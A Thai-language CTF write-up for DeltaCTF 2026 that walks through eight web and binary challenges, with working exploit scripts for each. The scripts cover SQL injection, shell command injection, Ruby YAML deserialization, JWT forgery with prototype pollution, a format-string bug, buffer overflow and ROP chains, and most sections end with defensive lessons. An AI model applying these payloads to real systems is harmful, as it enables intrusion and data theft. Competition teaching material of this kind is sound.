---
title: "DeltaCTF 2026 — Web & Pwn Writeups"
ctf: "DeltaCTF 2026"
date: 2026-06-27
category: web/pwn
author: "D0R07HY2 / Singularity"
---

# 🚩 DeltaCTF 2026 — Web & Pwn Writeups

**ทีม:** Singularity  
**ผู้เล่น:** D0R07HY2  
**แพลตฟอร์ม:** http://ctf.deltactf.site (IP: 13.238.150.105, EC2 ap-southeast-2)

---

## 📋 สารบัญ

1. [Eternity (Web, 100pts)](#1-eternity-web-100pts)
2. [Librarian Secret (Web, 100pts)](#2-librarian-secret-web-100pts)
3. [Pingpong (Web, 100pts)](#3-pingpong-web-100pts)
4. [Magic Ruby (Web, 100pts)](#4-magic-ruby-web-100pts)
5. [Subzero Station (Web, 100pts)](#5-subzero-station-web-100pts)
6. [Pwned01 (Pwn, 100pts)](#6-pwned01-pwn-100pts)
7. [The Echoes (Pwn, 176pts)](#7-the-echoes-pwn-176pts)
8. [Flag Facility (Pwn, 356pts)](#8-flag-facility-pwn-356pts)

---

## 1. Eternity (Web, 100pts)

**Flag:** `DELTA{1ts_just_l00k1ng_1n_th3_c0mm3nts}`

### 🎯 เป้าหมาย

ค้นหา flag ที่ซ่อนอยู่ในหน้าเว็บ

### ⚙️ ขั้นตอน

โจทย์ข้อนี้เป็น Web challenge ระดับง่ายที่สุด เหมาะสำหรับการเริ่มต้น

1. เปิด URL ที่กำหนด
2. คลิกขวา → เลือก **View Page Source** (หรือกด `Ctrl+U`)
3. Scroll ลงมาดู source code
4. พบ flag ถูกซ่อนไว้ใน HTML comment:

```html
<!-- DELTA{1ts_just_l00k1ng_1n_th3_c0mm3nts} -->
```

### 🔍 อธิบายแนวคิด

HTML comment คือ syntax ใน HTML ที่ใช้สำหรับเขียนหมายเหตุ (notes) ในโค้ด โดยจะไม่แสดงผลบนหน้าเว็บ แต่สามารถมองเห็นได้เมื่อดู source code:

```html
<!-- comment นี้จะไม่แสดงบนหน้าเว็บ -->
```

นักพัฒนาเว็บบางครั้งลืมลบ comment ที่มีข้อมูลสำคัญออกก่อน deploy ทำให้ผู้โจมตีสามารถเห็นข้อมูลลับได้

### 💎 สรุปบทเรียน

- **ตรวจสอบ HTML source code ทุกครั้ง** ก่อนที่จะพยายามวิธีอื่น
- ใช้ `Ctrl+U` หรือคลิกขวา → View Page Source
- Developer ลืมลบ comment ที่มี flag เป็นช่องโหว่ที่พบบ่อยใน CTF ระดับง่าย

---

## 2. Librarian Secret (Web, 100pts)

**Flag:** `DELTA{SQL_1nj3ct10n_1s_34sy_r1ght?}`

### 🎯 เป้าหมาย

เว็บห้องสมุดมีฟังก์ชันค้นหาหนังสือนิยาย — เราต้องขโมยข้อมูลจากตาราง `secrets` ที่ admin ซ่อนไว้

### ⚙️ ขั้นตอน

#### Step 1: ทดสอบว่า vulnerable หรือไม่

ฟอร์มค้นหาส่งค่า `title` ไปยัง `/search` ด้วย method POST ทดสอบ injection ง่ายๆ:

```
title='
```

ผลลัพธ์: หน้าเว็บแสดง error ของ SQLite — แสดงว่ามี SQL injection จริง

#### Step 2: หาจำนวน Columns

ใช้ `ORDER BY` เพื่อหาจำนวน column ในตาราง:

```sql
' ORDER BY 1 --   ✓ ใช้ได้
' ORDER BY 2 --   ✓ ใช้ได้
' ORDER BY 3 --   ✓ ใช้ได้
' ORDER BY 4 --   ✓ ใช้ได้
' ORDER BY 5 --   ✗ error!
```

สรุป: ตารางนี้มี **4 columns**

#### Step 3: UNION SELECT

เมื่อรู้จำนวน column แล้ว ใช้ `UNION SELECT` เพื่อรวมผลลัพธ์ของเรา:

```sql
' UNION SELECT 1,2,3,4 --
```

สังเกตว่า column 2 และ 3 แสดงผลบนหน้าเว็บ — เราจะใช้ column เหล่านี้ในการดึงข้อมูล

#### Step 4: หาชื่อตาราง

SQLite มีตารางระบบชื่อ `sqlite_master` เก็บข้อมูล schema ทั้งหมด:

```sql
' UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table' --
```

ผลลัพธ์:
- `novels` — ตารางปกติสำหรับเก็บข้อมูลหนังสือ
- `secrets` — ตารางเป้าหมายของเรา!

#### Step 5: ดึง Flag

ใช้ UNION SELECT ดึงข้อมูลจาก `secrets`:

```sql
' UNION SELECT id, secret_content, 1, title FROM secrets --
```

### 🔍 อธิบายแนวคิด

**SQL Injection** เกิดเมื่อ application นำ user input ไปต่อกับ SQL string โดยตรง โดยไม่ sanitize:

```python
# Vulnerable code
query = "SELECT * FROM novels WHERE title = '" + user_input + "'"
```

เมื่อเราส่ง `' UNION SELECT ... --` SQL ที่ถูกสร้างจะเป็น:

```sql
SELECT * FROM novels WHERE title = '' UNION SELECT id, secret_content, 1, title FROM secrets --'
```

`--` คือ comment ใน SQL ทำให้ส่วนที่เหลือของ query ถูก ignored

**UNION SELECT** ใช้รวมผลลัพธ์จาก 2 queries โดยต้องมีจำนวน column เท่ากัน

### Exploit Script

```python
import requests

url = "http://13.238.150.105:32555/search"
payload = "' UNION SELECT id, secret_content, 1, title FROM secrets --"
r = requests.post(url, data={"title": payload})

# flag อยู่ใน response text
print(r.text)
```

### 💎 สรุปบทเรียน

- **SQL Injection** เกิดจาก unsanitized input ใน SQL query
- ใช้ `ORDER BY` เพื่อหาจำนวน columns
- ใช้ `UNION SELECT` เพื่อดึงข้อมูลจากตารางอื่น
- SQLite มี `sqlite_master` สำหรับดู schema
- ป้องกัน: ใช้ parameterized query (`?` placeholders)

---

## 3. Pingpong (Web, 100pts)

**Flag:** `DELTA{p1ng_p0ng_c0mm4nd_1nj3ct10n_v1a_sh3ll}`

### 🎯 เป้าหมาย

เว็บมีฟังก์ชัน "ping" ที่รับ IP address แล้วรันคำสั่ง `ping` — เราต้องรันคำสั่งอื่นแทน

### ⚙️ ขั้นตอน

#### Step 1: ทำความเข้าใจ

ฟังก์ชัน ping น่าจะทำงานแบบนี้ใน backend:

```bash
ping -c 4 $user_input
```

ถ้าเราป้อน `127.0.0.1` จะกลายเป็น:

```bash
ping -c 4 127.0.0.1
```

#### Step 2: Command Injection

ใน shell, `|` (pipe) ใช้ส่ง output ของคำสั่งซ้ายไปเป็น input ของคำสั่งขวา:

```
127.0.0.1|cat /flag.txt
```

จะกลายเป็น:

```bash
ping -c 4 127.0.0.1|cat /flag.txt
```

shell รันทั้ง `ping -c 4 127.0.0.1` และ `cat /flag.txt` — flag ถูกแสดงผล

#### Step 3: ส่ง Payload

```bash
echo "127.0.0.1|cat /flag.txt" | nc 13.238.150.105 32570
```

### 🔍 อธิบายแนวคิด

**Command Injection** เกิดเมื่อ application ส่ง user input ไปยัง shell โดยตรง:

```ruby
# Vulnerable code
system("ping -c 4 #{params[:ip]}")
```

shell characters ที่ใช้ inject:
- `|` — pipe: รันทั้งสองคำสั่ง, ส่ง output ต่อกัน
- `;` — semicolon: รันคำสั่งต่อกัน
- `&&` — รันคำสั่งหลังถ้าคำสั่งหน้าสำเร็จ
- `` ` `` — backtick: command substitution
- `$(...)` — command substitution (modern)

### Exploit Script

```python
from pwn import *

r = remote("13.238.150.105", 32570)
r.sendline(b"127.0.0.1|cat /flag.txt")
print(r.recvall().decode())
```

```bash
# หรือใช้ netcat
echo "127.0.0.1|cat /flag.txt" | nc 13.238.150.105 32570
```

### 💎 สรุปบทเรียน

- **อย่าเชื่อ user input** — sanitize ก่อนส่งไปยัง shell
- shell metacharacters (`|`, `;`, `` ` ``, `$()`) ใช้สำหรับ command injection
- ใช้ `subprocess.run([...])` แบบ list arguments แทน shell string
- ถ้าจำเป็นต้องใช้ shell, ใช้ `shlex.quote()` ป้องกัน

---

## 4. Magic Ruby (Web, 100pts)

**Flag:** `DELTA{ruby_yaml_d3s3r14l1z4t1on_rce_magic}`

### 🎯 เป้าหมาย

Web app สร้างด้วย Ruby รับข้อมูล YAML จากผู้ใช้ — เราต้องทำให้ server รันคำสั่งตามที่เราต้องการ

### ⚙️ ขั้นตอน

#### Step 1: วิเคราะห์ Source Code

```ruby
class CommandTask
  def initialize(command)
    @command = command
  end

  def execute
    system(@command)    # รันคำสั่งบน shell!
  end
end

# route: POST /
data = YAML.load(request.body.read)  # ⚠️ VULNERABLE!
```

`YAML.load()` ใน Ruby สามารถ instantiate object **ใดๆ** จาก YAML input — รวมถึง `CommandTask` ที่มี method `execute` ซึ่งรัน `system()`

#### Step 2: สร้าง YAML Payload

Ruby YAML ใช้ `!ruby/object:ClassName` เพื่อสร้าง object:

```yaml
--- !ruby/object:CommandTask
command: cat /flag.txt
```

#### Step 3: ส่ง Payload

```bash
curl -X POST http://13.238.150.105:32590/ \
  --data '--- !ruby/object:CommandTask
command: cat /flag.txt'
```

### 🔍 อธิบายแนวคิด

**YAML Deserialization** เป็นช่องโหว่คล้ายกับ:
- `pickle.load()` ใน Python
- `ObjectInputStream.readObject()` ใน Java
- `unserialize()` ใน PHP

`YAML.load()` (unsafe) vs `YAML.safe_load()` (safe):

| ฟังก์ชัน | สามารถสร้าง object ได้ | เหมาะกับ |
|---------|----------------------|---------|
| `YAML.load()` | ✅ ใช่ — ทุกคลาส | ❌ ไม่ควรรับ user input |
| `YAML.safe_load()` | ❌ ไม่ — เฉพาะ basic types | ✅ user input |

### Exploit Script

```python
import requests

payload = """--- !ruby/object:CommandTask
command: cat /flag.txt"""

r = requests.post("http://13.238.150.105:32590/", data=payload)
print(r.text)
```

### 💎 สรุปบทเรียน

- **`YAML.load()` คือ unsafe** — ใช้ `YAML.safe_load()` เสมอ
- Deserialization มีช่องโหว่ RCE ในหลายภาษา:
  - Python: `pickle.load()`
  - Java: `readObject()`
  - PHP: `unserialize()`
  - Ruby: `YAML.load()`, `Marshal.load()`
- ถ้าเห็น YAML/Marshal/pickle ใน CTF → คิดถึง deserialization attack

---

## 5. Subzero Station (Web, 100pts)

**Flag:** `DELTA{4bs0lut3_z3r0_h4s_b33n_r34ch3d_succe55fully}`

### 🎯 เป้าหมาย

Web app สถานีวิจัยอุณหภูมิต่ำ — ต้องทำให้อุณหภูมิถึง -273.15°C (absolute zero) โดย:
1. ปลอม JWT token เพื่อเป็น admin
2. ใช้ prototype pollution เพื่อเปลี่ยนค่าอุณหภูมิ

### ⚙️ ขั้นตอน

#### Step 1: หา JWT Secret Key

เช็ค `robots.txt` — ไฟล์มาตรฐานที่บอก web crawler ว่าห้ามเข้าส่วนไหน:

```
GET http://13.238.150.105:32525/robots.txt
```

พบ:
```
User-agent: *
Disallow: /admin
# secret: iced_out_research_station_secret_2024
```

#### Step 2: วิเคราะห์ JWT Logic

Source code ใช้ JWT สำหรับ authentication:

```javascript
// การตรวจสอบ JWT
const decoded = jwt.verify(token, secret);

// การหา secret key
const secret = fs.readFileSync(decoded.header.kid);
```

**ปัญหา:** `kid` (key ID) ใน JWT header ใช้เปิดไฟล์! ถ้าเราส่ง `kid: "../../dev/null"`:

```javascript
const secret = fs.readFileSync("../../dev/null");  // → ""
```

secret key จะเป็น **empty string**! เราสามารถ sign JWT ด้วย secret ว่างได้

#### Step 3: Forge JWT

```python
import jwt

token = jwt.encode(
    {"username": "admin", "iat": 0, "admin": True},
    "",                    # empty string secret
    algorithm="HS256",
    headers={"kid": "../../dev/null"}
)
```

#### Step 4: Prototype Pollution

Source code มีฟังก์ชัน merge ที่ vulnerable:

```javascript
function merge(a, b) {
  for (let key in b) {
    if (typeof b[key] === 'object') merge(a[key], b[key]);
    a[key] = b[key];
  }
}
```

ฟังก์ชันนี้ vulnerable ต่อ **prototype pollution** — เราสามารถแก้ไข `Object.prototype` ผ่าน `__proto__`:

```javascript
// ส่ง JSON นี้ไปที่ /calibrate
{
  "__proto__": {
    "temperature": -273.15
  }
}
```

เมื่อ merge ทำงาน, `Object.prototype.temperature` จะถูกตั้งค่า ทำให้ **ทุก object** มี property `temperature = -273.15` รวมถึง object ที่ใช้เช็ค flag ด้วย

#### Step 5: ขอ Flag

```python
r = requests.get(
    "http://13.238.150.105:32525/admin",
    cookies={"session": token}
)
print(r.text)
```

### 🔍 อธิบายแนวคิด

#### JWT Structure

JWT ประกอบด้วย 3 ส่วน (base64-encoded คั่นด้วย `.`):

```
header.payload.signature
```

Header ของ JWT:
```json
{
  "alg": "HS256",
  "kid": "../../dev/null"   // path traversal!
}
```

#### Path Traversal ใน kid

ปกติ `kid` ใช้อ้างอิง key จาก database แต่โค้ดนี้ใช้ `readFileSync` ทำให้เราสามารถชี้ไปที่ไฟล์อื่นได้:

```
ปกติ:     kid = "secret.key"       → readFileSync("secret.key")
attack:   kid = "../../dev/null"   → readFileSync("../../dev/null")
                                                    → empty string
```

#### Prototype Pollution

JavaScript object ทุกอันสืบทอดจาก `Object.prototype` ถ้าเราแก้ prototype:

```javascript
let obj = {};
obj.temperature  // undefined

// หลังจาก prototype pollution:
Object.prototype.temperature = -273.15;
obj.temperature  // -273.15
```

### Complete Exploit

```python
import jwt
import requests

BASE = "http://13.238.150.105:32525"

# 1. Forge JWT with empty secret
token = jwt.encode(
    {"username": "admin", "iat": 0, "admin": True},
    "",
    algorithm="HS256",
    headers={"kid": "../../dev/null"}
)

# 2. Prototype pollution → set temperature to absolute zero
requests.post(
    f"{BASE}/calibrate",
    cookies={"session": token},
    json={"__proto__": {"temperature": -273.15}}
)

# 3. Get flag from /admin
r = requests.get(f"{BASE}/admin", cookies={"session": token})
print(r.text)
```

### 💎 สรุปบทเรียน

- **JWT `kid` path traversal** — ถ้า `kid` ใช้เปิดไฟล์, ชี้ไปที่ `/dev/null` เพื่อ bypass
- **Prototype Pollution** — ฟังก์ชัน `merge()` ที่ไม่ปลอดภัยทำให้เปลี่ยนแปลง `Object.prototype`
- **Chaining vulnerabilities** — รวม 2 ช่องโหว่เพื่อ bypass authentication + business logic
- ตรวจสอบ `robots.txt` ทุกครั้ง — มักมีข้อมูลสำคัญซ่อนอยู่

---

## 6. Pwned01 (Pwn, 100pts)

**Flag:** `DELTA{formatstringvulnerability}`

### 🎯 เป้าหมาย

Binary `vuln` มีช่องโหว่ Format String — ใช้อ่าน/เขียนหน่วยความจำตามอำเภอใจ

### ⚙️ ขั้นตอน

#### Step 1: ตรวจสอบ Binary

```bash
file vuln
# ELF 64-bit LSB executable, x86-64

checksec vuln
# No PIE, No canary, NX enabled
```

#### Step 2: Decompile

ใช้ Ghidra หรือ objdump:

```c
void vuln() {
  char buf[64];
  read(0, buf, 200);    // อ่าน input
  printf(buf);          // ⚠️ FORMAT STRING VULNERABILITY!
}
```

#### Step 3: ทดสอบ

```bash
echo "AAAA.%p.%p.%p.%p" | ./vuln
```

Output:
```
AAAA.0x7fff...0x...0x...0x...
```

`%p` อ่านค่า pointer จาก stack และ leak ข้อมูล

### 🔍 อธิบายแนวคิด

`printf()` รับ argument แรกเป็น format string:

```c
printf("%s", buf);   // ✅ SAFE: buf เป็น data
printf(buf);         // ⚠️ VULNERABLE: buf เป็น format string
```

เมื่อเราส่ง input `%p.%p.%p` — `printf` จะอ่านค่า 3 ค่าถัดไปจาก stack แล้วแสดงเป็น pointer

Format specifiers ที่สำคัญ:
- `%p` — leak pointer (8 bytes)
- `%x` — leak hex
- `%s` — leak string (อ่านจาก address ใน stack)
- `%n` — **เขียน** จำนวน bytes ที่พิมพ์ไปยัง address

### 💎 สรุปบทเรียน

- `printf(user_input)` แทน `printf("%s", user_input)` ทำให้เกิด format string vulnerability
- ใช้ `%p`, `%x` เพื่ออ่านค่าบน stack
- ใช้ `%n` เพื่อเขียนค่าไปยัง address ใดๆ
- ป้องกัน: ใช้ `printf("%s", buf)` เสมอ

---

## 7. The Echoes (Pwn, 176pts)

**Flag:** `DELTA{st4ck_sm4shing_1s_fun_2026}`

### 🎯 เป้าหมาย

Binary มี buffer overflow ผ่าน `gets()` — ต้องเปลี่ยน return address เพื่อ jump ไปฟังก์ชัน `get_shell` ที่รัน `/bin/sh`

### ⚙️ ขั้นตอน

#### Step 1: วิเคราะห์ Binary

```bash
file vuln
# ELF 64-bit LSB executable, x86-64

checksec vuln
# EXEC (no PIE), No canary, NX enabled
```

Decompile ด้วย Ghidra:

```c
void vuln() {
  char buf[64];        // buffer size 64 bytes (0x40)
  gets(buf);           // ⚠️ BUFFER OVERFLOW!
                       // gets() ไม่มีการจำกัดขนาด!
}

void get_shell() {
  puts("Wow...");
  system("/bin/sh");   // ได้ shell!
}
```

#### Step 2: หา Offset

จาก assembly: `buf` อยู่ที่ `rbp-0x40` (64 bytes จาก rbp)

```
[buf: 64 bytes] [saved rbp: 8 bytes] [return address: 8 bytes]
|_______________72 bytes______________|
```

ต้องใช้ padding **72 bytes** ก่อนถึง return address

#### Step 3: หา Address

```bash
objdump -d vuln | grep get_shell
# 0x4011b6: get_shell

objdump -d vuln | grep -A1 "ret$"
# 0x40101a: ret
```

#### Step 4: Stack Alignment (movaps)

**ปัญหาสำคัญ:** บน x86-64, instruction `movaps` ใน `system()` ต้องการให้ stack มี 16-byte alignment ถ้า stack ไม่ตรง → จะเกิด **Segmentation Fault**

**สาเหตุ:** ปกติเมื่อฟังก์ชันถูกเรียก, stack จะถูก push return address (8 bytes) ทำให้ alignment เสีย

**วิธีแก้:** เพิ่ม `ret` gadget ก่อน jump ไป `get_shell`:

```python
payload = b"A" * 72    # padding
payload += p64(ret)    # ret gadget → align stack
payload += p64(get_shell)  # jump to get_shell
```

`ret` จะ pop 8 bytes จาก stack ทำให้ alignment กลับมาถูกต้อง

#### Step 5: Exploit

```
Stack Layout:
┌──────────────────────┐
│  get_shell (0x4011b6)    │ ← return address
├──────────────────────┤
│  ret (0x40101a)          │ ← stack alignment
├──────────────────────┤
│  padding 72 bytes         │
│  (buf + saved rbp)        │
└──────────────────────┘
```

### 🔍 อธิบายแนวคิด

#### Stack Layout

```
Stack (high addresses → low):
┌──────────────────────┐
│  return address       │ ← overwrite นี้!
├──────────────────────┤
│  saved rbp (8 bytes)  │ ← overwrite นี้!
├──────────────────────┤
│  buf[64]              │ ← input ของเรา
└──────────────────────┘
```

#### gets() Buffer Overflow

`gets()` อ่าน input จนเจอ newline (`\n`) โดยไม่จำกัดขนาด — ทำให้เขียนเกิน buffer ทับ saved rbp และ return address

#### Why ret gadget?

ก่อนเรียก `system()`:
```
Stack pointer (RSP) = 0x...8  → NOT 16-byte aligned! ⚠️
```

หลังจาก `ret`:
```
RSP pops 8 bytes → RSP = 0x...0 → 16-byte aligned ✅
```

### Exploit Script

```python
from pwn import *

r = remote("13.238.150.105", 1338)
r.recvuntil(b"Enter some text:")

get_shell = 0x4011b6
ret = 0x40101a

# Build payload
payload = b"A" * 72          # buffer + saved rbp
payload += p64(ret)          # stack alignment (movaps)
payload += p64(get_shell)    # jump to get_shell

r.sendline(payload)
r.sendline(b"cat /flag*")    # หลังจากได้ shell

print(r.recvall(timeout=3).decode())
```

### 💎 สรุปบทเรียน

- **`gets()` ไม่ปลอดภัย** — ไม่มีการตรวจสอบ buffer size
- **Buffer overflow → control return address**
- **ret2win (return to win)** — jump ไปฟังก์ชันที่มี shell
- **Stack alignment (movaps)** — ปัญหาสำคัญบน x86-64 เพิ่ม `ret` gadget ก่อน jump
- ใช้ `checksec` เพื่อดู security features ของ binary
- ใช้ `objdump` หรือ Ghidra เพื่อหา address

---

## 8. Flag Facility (Pwn, 356pts)

**Flag:** `DELTA{4r3_y0u_r3ady_f0r_th3_r0p_4rm4g3dd0n?}`

### 🎯 เป้าหมาย

Binary มี buffer overflow + ROP — ต้องเรียก `win()` พร้อม argument ที่ถูกต้อง (`0xdeadbeef`, `0xcafebabe`)

### ⚙️ ขั้นตอน

#### Step 1: วิเคราะห์ Binary

```bash
file flag_facility
# ELF 64-bit, EXEC (no PIE)

checksec flag_facility
# No PIE, No canary, NX enabled
```

Decompile ด้วย Ghidra:

```c
void vuln() {
  char buf[32];           // buffer 32 bytes (0x20)
  read(0, buf, 256);      // ⚠️ overflow! อ่านได้ 256 bytes
}

void win(int a, int b) {
  if (a == 0xdeadbeef && b == 0xcafebabe) {
    system("cat flag.txt");
  }
}
```

ฟังก์ชัน `win()` ต้องการ:
- arg1 (`rdi`) = `0xdeadbeef`
- arg2 (`rsi`) = `0xcafebabe`

#### Step 2: ROP Gadgets

ใน x86-64, argument ส่งผ่าน register:
- arg1 → `rdi`
- arg2 → `rsi`

Binary มีฟังก์ชัน `gadget_farm` ที่มี gadgets ให้เรา:

```asm
0x401280: pop rdi; ret
0x401282: pop rsi; pop r15; ret   ; pop rsi แต่ต้อง pop r15 เพิ่ม
```

ที่อยู่ `0x401282` คือ `pop rsi; pop r15; ret` — ต้องเพิ่ม padding 8 bytes สำหรับ `r15`

#### Step 3: สร้าง ROP Chain

```
Stack (low → high):
┌──────────────────────────────────┐
│ win (0x4011f6)                    │ ← return after pop_rsi_r15
├──────────────────────────────────┤
│ 0x0 (padding for r15)             │ ← pop r15
├──────────────────────────────────┤
│ 0xcafebabe (arg2 → rsi)          │ ← pop rsi
├──────────────────────────────────┤
│ pop_rsi_r15 (0x401282)            │
├──────────────────────────────────┤
│ 0xdeadbeef (arg1 → rdi)          │ ← pop rdi
├──────────────────────────────────┤
│ pop_rdi (0x401280)                │
├──────────────────────────────────┤
│ ret (0x40101a)                    │ ← stack alignment
├──────────────────────────────────┤
│ saved rbp (8 bytes)               │
├──────────────────────────────────┤
│ buf[32]                           │
└──────────────────────────────────┘
```

#### Step 4: Stack Alignment

เช่นเดียวกับ Echoes — ถ้า `win` เรียก `system()` ต้อง align stack ด้วย `ret` ก่อน

### 🔍 อธิบายแนวคิด

#### ROP (Return-Oriented Programming)

เมื่อ NX ป้องกัน shellcode, เราไม่สามารถรันโค้ดที่เราเขียนลง stack ได้ (shellcode ใช้ไม่ได้) แต่เรายังใช้ existing code ("gadgets") ใน binary ได้:

**Gadget** = instruction ที่ลงท้ายด้วย `ret` เสมอ
```
pop rdi       ; เอา 8 bytes จาก stack ใส่ rdi
ret           ; เอา 8 bytes ถัดไป → jump ไปที่ address นั้น
```

**ROP Chain** = การเรียง gadgets ต่อกันบน stack:

```
Stack:
[addr_gadget1]  → executes "pop rdi; ret"
[value_for_rdi] → pop ไปที่ rdi
[addr_gadget2]  → executes "pop rsi; ret"
[value_for_rsi] → pop ไปที่ rsi
[addr_win]      → calls win(0xdeadbeef, 0xcafebabe)
```

#### x86-64 Calling Convention

| Argument | Register | ตัวอย่าง |
|----------|----------|---------|
| arg1 | `rdi` | `0xdeadbeef` |
| arg2 | `rsi` | `0xcafebabe` |
| arg3 | `rdx` | - |
| arg4 | `rcx` | - |

### Exploit Script

```python
from pwn import *

r = remote("13.238.150.105", 1339)
r.recvuntil(b"> ")

# Addresses from objdump
pop_rdi = 0x401280       # pop rdi; ret
pop_rsi_r15 = 0x401282   # pop rsi; pop r15; ret
ret = 0x40101a           # ret (stack alignment)
win = 0x4011f6           # win function

# Build ROP chain
payload = b"A" * 32      # buffer
payload += b"B" * 8      # saved rbp
payload += p64(ret)      # stack alignment (movaps)
payload += p64(pop_rdi) + p64(0xdeadbeef)          # arg1
payload += p64(pop_rsi_r15) + p64(0xcafebabe) + p64(0)  # arg2 + padding for r15
payload += p64(win)      # call win

r.send(payload)
print(r.recvall(timeout=5).decode())
```

### ตัวอย่าง Output

```
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB@
  @
  @@
  @
cat flag.txt: DELTA{4r3_y0u_r3ady_f0r_th3_r0p_4rm4g3dd0n?}
```

### 💎 สรุปบทเรียน

- **ROP (Return-Oriented Programming)** — bypass NX โดย reuse existing code
- **Gadgets** = code snippets ที่ลงท้ายด้วย `ret`
- **Function arguments** บน x86-64: `rdi` = arg1, `rsi` = arg2
- **Gadget Farm** — ผู้เขียน challenge จงใจใส่ gadgets ให้
- **Stack Alignment** — ใช้ `ret` เพื่อ 16-byte alignment ก่อน `system()`
- ใช้ `ROPgadget` หรือ `objdump` เพื่อหา gadgets

---

## 📊 สรุปภาพรวม

| # | Challenge | Category | Points | Core Technique |
|---|-----------|----------|--------|----------------|
| 1 | Eternity | Web | 100 | HTML comment |
| 2 | Librarian Secret | Web | 100 | SQL Injection (UNION SELECT) |
| 3 | Pingpong | Web | 100 | Command Injection |
| 4 | Magic Ruby | Web | 100 | Ruby YAML Deserialization RCE |
| 5 | Subzero Station | Web | 100 | JWT forgery + Prototype Pollution |
| 6 | Pwned01 | Pwn | 100 | Format String Vulnerability |
| 7 | The Echoes | Pwn | 176 | Buffer Overflow → ret2win |
| 8 | Flag Facility | Pwn | 356 | Buffer Overflow → ROP Chain |

### 🛠️ Tools ที่ใช้

| Tool | การใช้งาน |
|------|----------|
| **Python + pwntools** | สร้าง payload, connect remote, ROP chain |
| **Ghidra** | decompile binary ดู source code |
| **objdump** | หา address ของฟังก์ชันและ gadgets |
| **checksec** | ตรวจสอบ security features |
| **curl / Burp Suite** | ทดสอบ web request |
| **Netcat** | เชื่อมต่อ TCP กับ service |
| **ROPgadget** | ค้นหา ROP gadgets ใน binary |

### 📚 สรุปบทเรียน

1. **Web:** ตรวจสอบพื้นฐานก่อนเสมอ — source code, robots.txt, HTML comments
2. **SQLi:** UNION SELECT + sqlite_master เพื่อ enumerate schema
3. **Deserialization:** YAML.load(), pickle.load() — อย่ารับ input จาก user โดยตรง
4. **JWT:** ตรวจสอบ `kid` path traversal, weak/empty secret
5. **Prototype Pollution:** `__proto__` ใน JavaScript merge function
6. **PWN basics:** Format string, buffer overflow, ret2win, ROP
7. **Stack alignment:** movaps issue — ต้องใช้ `ret` gadget ช่วย

---

*Happy Hacking! 🚩*
